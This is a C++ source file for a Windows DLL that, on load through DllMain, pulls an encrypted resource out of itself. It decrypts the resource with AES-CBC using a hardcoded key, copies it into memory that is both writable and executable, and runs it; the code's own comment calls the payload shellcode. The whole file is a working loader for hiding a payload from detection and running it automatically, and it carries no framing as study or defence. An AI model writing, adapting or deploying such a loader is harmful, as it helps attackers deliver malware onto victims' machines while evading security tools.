#include "pch.h"
#include <windows.h>
#include <iostream>
#include <bcrypt.h>
#include "resource.h"

#pragma comment(lib, "bcrypt.lib")

void decrypt(BYTE* buf, size_t dwSize) {
    static const BYTE keyss[] = {
        0x4b, 0x44, 0x42, 0x4d, 0x01, 0x00, 0x00, 0x00,
        0x10, 0x00, 0x00, 0x00, 0x68, 0x65, 0x6c, 0x6c,
        0x6f, 0x69, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73,
        0x73, 0x73, 0x73, 0x73
    };

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) return;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject,
        sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) return;

    PUCHAR pbKeyObject = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) return;

    status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
        pbKeyObject, cbKeyObject,
        (PUCHAR)keyss, sizeof(keyss), 0);
    if (!BCRYPT_SUCCESS(status)) return;

    PUCHAR pbDecrypted = (PUCHAR)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ULONG cbDecrypted = 0;

    status = BCryptDecrypt(hKey, buf, (ULONG)dwSize, NULL, NULL, 0,
        pbDecrypted, (ULONG)dwSize, &cbDecrypted, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) return;

    ((void(*)())pbDecrypted)(); // Run shellcode

    VirtualFree(pbDecrypted, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

int shell(HMODULE hMod) {
    HRSRC hRsrc = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRsrc) {
        printf("FindResourceW failed: %d\n", GetLastError());
        return -1;
    }

    HGLOBAL hGRsrc = LoadResource(hMod, hRsrc);
    if (!hGRsrc) {
        printf("LoadResource failed: %d\n", GetLastError());
        return -1;
    }

    PVOID pData = LockResource(hGRsrc);
    if (!pData) {
        printf("LockResource failed: %d\n", GetLastError());
        return -1;
    }

    DWORD dwSize = SizeofResource(hMod, hRsrc);
    decrypt((BYTE*)pData, dwSize);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        shell(hModule);
    }
    return TRUE;
}
